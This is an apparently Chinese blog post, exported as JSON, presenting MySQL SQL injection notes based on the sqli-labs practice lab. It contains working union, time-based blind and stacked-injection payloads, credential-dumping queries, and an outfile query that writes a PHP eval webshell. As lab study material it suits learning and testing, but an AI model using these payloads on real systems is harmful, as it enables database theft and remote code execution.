{"title":"sql注入从零到一","uid":"36e7a6d4a5aae3b4367acd589247ef71","slug":"AA_sql注入从零到一","date":"2023-08-25T12:30:34.000Z","updated":"2024-04-23T09:04:31.042Z","comments":true,"path":"api/articles/AA_sql注入从零到一.json","keywords":null,"cover":"../picture/39.jpg","content":"<h2 id=\"sql注入从零到一\"><a href=\"#sql注入从零到一\" class=\"headerlink\" title=\"sql注入从零到一\"></a>sql注入从零到一</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>仅以此篇，回顾sql注入从零到一的时光。</p></blockquote>\n<p><img src=\"/../all_picture/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80_01_1.png\" alt=\"picture\"></p>\n<p><img src=\"/../all_picture/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80_01.png\" alt=\"picture\"></p>\n<p><img src=\"/../all_picture/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80_02.png\" alt=\"picture\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>这里只研究了mysql数据库。</p></blockquote>\n<h3 id=\"联合注入-union\"><a href=\"#联合注入-union\" class=\"headerlink\" title=\"联合注入(union)\"></a>联合注入(union)</h3><h4 id=\"sql注入的起点-sqli-labs-1-4\"><a href=\"#sql注入的起点-sqli-labs-1-4\" class=\"headerlink\" title=\"sql注入的起点(sqli-labs 1~4)\"></a>sql注入的起点(sqli-labs 1~4)</h4><h5 id=\"根据报错信息判断闭合\"><a href=\"#根据报错信息判断闭合\" class=\"headerlink\" title=\"根据报错信息判断闭合\"></a>根据报错信息判断闭合</h5><p>最开始学习sql注入的本质，其实就是1 or 1&#x3D;1 。</p>\n<p>这里我们以sqli-labs第一关为例，我们输入 1’ 进行测试，发现返回报错如下：</p>\n<p><img src=\"/../all_picture/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80_03.png\" alt=\"picture\"></p>\n<p>此时，我们输入的为 1’ , 1’ 前面的单引号与后面的单引号闭合，’1’’前面的单引号与LIMIT 0,1后面的单引号形成闭合，我们可以初步判断此时sql注入语句已经完成闭合。</p>\n<h5 id=\"然后使用联合注入获取信息\"><a href=\"#然后使用联合注入获取信息\" class=\"headerlink\" title=\"然后使用联合注入获取信息\"></a>然后使用联合注入获取信息</h5><p>普通数据库基本操作，相当于直接在数据库中查询，学习sql语句即可。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">1&#39; order by 3--+\n1&#39; order by 4--+\n-1&#39; union select 1,2,3--+\n-1&#39; union select 1,2,database()--+\n-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where  table_schema &#x3D; &quot;security&quot; --+\n-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;users&quot; --+\n-1&#39; union select 1,2,group_concat(username,&#39;:&#39;,password) from users --+</code></pre>\n\n<h3 id=\"布尔盲注-1-and-1\"><a href=\"#布尔盲注-1-and-1\" class=\"headerlink\" title=\"布尔盲注(1 and 1)\"></a>布尔盲注(1 and 1)</h3><h4 id=\"substr\"><a href=\"#substr\" class=\"headerlink\" title=\"substr()\"></a>substr()</h4><h4 id=\"left\"><a href=\"#left\" class=\"headerlink\" title=\"left()\"></a>left()</h4><h4 id=\"mid\"><a href=\"#mid\" class=\"headerlink\" title=\"mid\"></a>mid</h4><h3 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h3><h4 id=\"floor\"><a href=\"#floor\" class=\"headerlink\" title=\"floor()\"></a>floor()</h4><h4 id=\"benchmark-和-extractvalue\"><a href=\"#benchmark-和-extractvalue\" class=\"headerlink\" title=\"benchmark() 和 extractvalue()\"></a>benchmark() 和 extractvalue()</h4><h3 id=\"时间盲注\"><a href=\"#时间盲注\" class=\"headerlink\" title=\"时间盲注\"></a>时间盲注</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://www.anquanke.com/post/id/170626\">https://www.anquanke.com/post/id/170626</a><br>这里推荐某大佬的博客，学习盲注相关知识。</p></blockquote>\n<h4 id=\"sleep-和benchmark\"><a href=\"#sleep-和benchmark\" class=\"headerlink\" title=\"sleep()和benchmark()\"></a>sleep()和benchmark()</h4><h5 id=\"使用-if-函数\"><a href=\"#使用-if-函数\" class=\"headerlink\" title=\"使用 if() 函数\"></a>使用 if() 函数</h5><p>if(expre1，expre2，expre3) 当expre1为true时，返回expre2，false时，返回expre3 。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"># sleep()\nmysql&gt; select * from users where id &#x3D;1 and if(length((select database()))&#x3D;7,sleep(5),1);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.06 sec)\n\nmysql&gt; select * from users where id &#x3D;1 and if(length((select database()))&#x3D;8,sleep(5),1);\nEmpty set (5.01 sec)</code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"># benchmark()\nmysql&gt; select * from users where id &#x3D;1 and if((length((select database()))&#x3D;7),benchmark(20000000,md5(&#39;a&#39;)),1);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.08 sec)\n\nmysql&gt; select * from users where id &#x3D;1 and if((length((select database()))&#x3D;8),benchmark(20000000,md5(&#39;a&#39;)),1);\nEmpty set (5.17 sec)</code></pre>\n\n<h5 id=\"使用-case-when-then-else-end-语句-当-if-被过滤\"><a href=\"#使用-case-when-then-else-end-语句-当-if-被过滤\" class=\"headerlink\" title=\"使用 case when then else end 语句(当 if 被过滤)\"></a>使用 case when then else end 语句(当 if 被过滤)</h5><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"># sleep()\nmysql&gt; select * from users where id &#x3D;1 and case when (length((select database()))&#x3D;7) then sleep(5) else 1 end;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.07 sec)\n\nmysql&gt; select * from users where id &#x3D;1 and case when (length((select database()))&#x3D;8) then sleep(5) else 1 end;\nEmpty set (5.89 sec)</code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"># benchmark\nmysql&gt; select * from users where id &#x3D;1 and case when (length((select database()))&#x3D;7) then benchmark(10000000,md5(&#39;a&#39;)) else 1 end;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.09 sec)\n\nmysql&gt; select * from users where id &#x3D;1 and case when (length((select database()))&#x3D;8) then benchmark(10000000,md5(&#39;a&#39;)) else 1 end;\nEmpty set (5.73 sec)</code></pre>\n\n<h4 id=\"笛卡尔积-heavy-query\"><a href=\"#笛卡尔积-heavy-query\" class=\"headerlink\" title=\"笛卡尔积(heavy query)\"></a>笛卡尔积(heavy query)</h4><p>heavy query顾名思义就是通过做大量的查询导致查询时间较长来达到延时的目的。通常选择一些比较大的表做笛卡尔积运算。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"># 额，这个运算时间太长了，不要尝试。\n SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;\n\n# 这里我们尝试换一个小一点的表尝试\nmysql&gt; SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.schemata C;\n+----------+\n| count(*) |\n+----------+\n| 57399894 |\n+----------+\n1 row in set (2.85 sec)</code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"># 具体利用同上\nmysql&gt; select * from users where id &#x3D;1 and if(length((select database()))&#x3D;7,(SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.schemata C),1);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.08 sec)\n\n\nmysql&gt; select * from users where id &#x3D;1 and if(length((select database()))&#x3D;8,(SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.schemata C),1);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (2.91 sec)</code></pre>\n\n<h4 id=\"GET-LOCK\"><a href=\"#GET-LOCK\" class=\"headerlink\" title=\"GET_LOCK()\"></a>GET_LOCK()</h4><p>GET_LOCK(key,timeout)</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"># 基本语句：\nSELECT GET_LOCK(key, timeout) FROM DUAL;\nSELECT RELEASE_LOCK(key) FROM DUAL;</code></pre>\n\n<h4 id=\"RLIKE正则\"><a href=\"#RLIKE正则\" class=\"headerlink\" title=\"RLIKE正则\"></a>RLIKE正则</h4><ul>\n<li><p>rpad(str,len,padstr)</p>\n<ul>\n<li>用字符串 padstr 对 str 进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len’，那么它将被截除到 len个字符。</li>\n</ul>\n</li>\n<li><p>repeat(str,times)</p>\n<ul>\n<li>复制字符串times次</li>\n</ul>\n</li>\n</ul>\n<p>通过 rpad 或 repeat 构造长字符串，加以计算量大的pattern，通过 repeat 的参数可以控制延时长短。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">select concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;;\n\n 正则语法：\n . : 匹配任意单个字符\n * ： 匹配0个或多个前一个得到的字符\n [] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。\n ^ : 匹配开头，如^s匹配以s或者S开头的字符串。\n $ : 匹配结尾，如s$匹配以s结尾的字符串。\n &#123;n&#125; : 匹配前一个字符反复n次。</code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">mysql&gt; select * from users where id &#x3D;1 and if(length((select database()))&#x3D;8,(select concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;),1);\nEmpty set (4.21 sec)\n\nmysql&gt; select * from users where id &#x3D;1 and if(length((select database()))&#x3D;7,(select concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;),1);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.08 sec)</code></pre>\n\n<h3 id=\"outfile写入shell\"><a href=\"#outfile写入shell\" class=\"headerlink\" title=\"outfile写入shell\"></a>outfile写入shell</h3><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">mysql&gt; show variables like &#39;%secure%&#39;;\n+--------------------------+-------+\n| Variable_name            | Value |\n+--------------------------+-------+\n| require_secure_transport | OFF   |\n| secure_auth              | ON    |\n| secure_file_priv         | NULL  |\n+--------------------------+-------+\n3 rows in set (0.11 sec)</code></pre>\n\n<p>修改 MySQL 下的 my.ini 配置文件：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">secure_file_priv&#x3D;&quot;&#x2F;&quot;</code></pre>\n\n<p>查看网页目录：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">mysql&gt; select * from users where id &#x3D; &#39;1&#39; UNION SELECT 1,@@basedir,@@datadir;\n+----+-------------------------------------------------+------------------------------------------------------+\n| id | username                                        | password                                             |\n+----+-------------------------------------------------+------------------------------------------------------+\n|  1 | Dumb                                            | Dumb                                                 |\n|  1 | D:\\PHP\\php\\phpstudy_pro\\Extensions\\MySQL5.7.26\\ | D:\\PHP\\php\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\ |\n+----+-------------------------------------------------+------------------------------------------------------+\n2 rows in set (0.08 sec)</code></pre>\n\n<p>写入webshell文件：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">mysql&gt; select * from users where id&#x3D;((&#39;1&#39;)) UNION SELECT 1,2,&#39;&lt;?php @eval($_POST[&quot;attack&quot;]);?&gt;&#39; into outfile &quot;D:\\\\PHP\\\\php\\\\phpstudy_pro\\\\WWW\\\\sqli-labs-master\\\\Less-7\\\\text.php&quot;;\nQuery OK, 2 rows affected (0.01 sec)</code></pre>\n\n<h3 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h3><h4 id=\"插入、删除数据\"><a href=\"#插入、删除数据\" class=\"headerlink\" title=\"插入、删除数据\"></a>插入、删除数据</h4><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">mysql&gt; select * from users where id &#x3D; &#39;1&#39;;insert into users(id,username,password) value (22,&#39;nihao&#39;,&#39;nihao&#39;);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.09 sec)\n\nQuery OK, 1 row affected (0.01 sec)\n\nmysql&gt; delete from users where id &#x3D; 22;\nQuery OK, 1 row affected (0.01 sec)</code></pre>\n\n<h4 id=\"堆叠sql语句时间盲注\"><a href=\"#堆叠sql语句时间盲注\" class=\"headerlink\" title=\"堆叠sql语句时间盲注\"></a>堆叠sql语句时间盲注</h4><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">mysql&gt; select * from users where id&#x3D;&#39;-1&#39;;select if(ord(substring(user(),1,1))&#x3D;114,sleep(3),1);\nEmpty set\n\n+-----------------------------------------------+\n| if(ord(substring(user(),1,1))&#x3D;114,sleep(3),1) |\n+-----------------------------------------------+\n|                                             0 |\n+-----------------------------------------------+\n1 row in set (3.09 sec)</code></pre>","feature":false,"text":"sql注入从零到一 仅以此篇，回顾sql注入从零到一的时光。 这里只研究了mysql数据库。 联合注入(union)sql注入的起点(sqli-labs 1~4)根据报错信息判断闭合最开始学习sql注入的本质，其实就是1 or 1&#x3D;1 。 这里我们以sqli-labs第...","link":"","photos":[],"count_time":{"symbolsCount":"8.9k","symbolsTime":"8 mins."},"categories":[{"name":"知识体系","slug":"知识体系","count":2,"path":"api/categories/知识体系.json"}],"tags":[{"name":"sql注入","slug":"sql注入","count":1,"path":"api/tags/sql注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80\"><span class=\"toc-text\">sql注入从零到一</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-union\"><span class=\"toc-text\">联合注入(union)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E8%B5%B7%E7%82%B9-sqli-labs-1-4\"><span class=\"toc-text\">sql注入的起点(sqli-labs 1~4)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%A0%B9%E6%8D%AE%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88\"><span class=\"toc-text\">根据报错信息判断闭合</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">然后使用联合注入获取信息</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-1-and-1\"><span class=\"toc-text\">布尔盲注(1 and 1)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#substr\"><span class=\"toc-text\">substr()</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#left\"><span class=\"toc-text\">left()</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#mid\"><span class=\"toc-text\">mid</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">报错注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#floor\"><span class=\"toc-text\">floor()</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#benchmark-%E5%92%8C-extractvalue\"><span class=\"toc-text\">benchmark() 和 extractvalue()</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8\"><span class=\"toc-text\">时间盲注</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#sleep-%E5%92%8Cbenchmark\"><span class=\"toc-text\">sleep()和benchmark()</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8-if-%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">使用 if() 函数</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8-case-when-then-else-end-%E8%AF%AD%E5%8F%A5-%E5%BD%93-if-%E8%A2%AB%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">使用 case when then else end 语句(当 if 被过滤)</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF-heavy-query\"><span class=\"toc-text\">笛卡尔积(heavy query)</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#GET-LOCK\"><span class=\"toc-text\">GET_LOCK()</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#RLIKE%E6%AD%A3%E5%88%99\"><span class=\"toc-text\">RLIKE正则</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#outfile%E5%86%99%E5%85%A5shell\"><span class=\"toc-text\">outfile写入shell</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">堆叠注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%92%E5%85%A5%E3%80%81%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE\"><span class=\"toc-text\">插入、删除数据</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%A0%86%E5%8F%A0sql%E8%AF%AD%E5%8F%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8\"><span class=\"toc-text\">堆叠sql语句时间盲注</span></a></li></ol></li></ol></li></ol>","author":{"name":"南瓜の无名","slug":"blog-author","avatar":"../picture/head_01.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"ssti模板注入学习笔记-flask前置知识","uid":"1e1792beaab2c135cf1beec290eff7af","slug":"note_flask_study","date":"2023-04-14T10:49:36.000Z","updated":"2023-05-10T11:44:14.126Z","comments":true,"path":"api/articles/note_flask_study.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/1.jpg","text":"flask是一个使用python编写的轻量级web应用框架 python可以直接用flask启动一个web服务页面 cd &#x2F;opt&#x2F;flask1 source .&#x2F;bin&#x2F;activate cd &#x2F;root vim demo.py...","link":"","photos":[],"count_time":{"symbolsCount":"5.6k","symbolsTime":"5 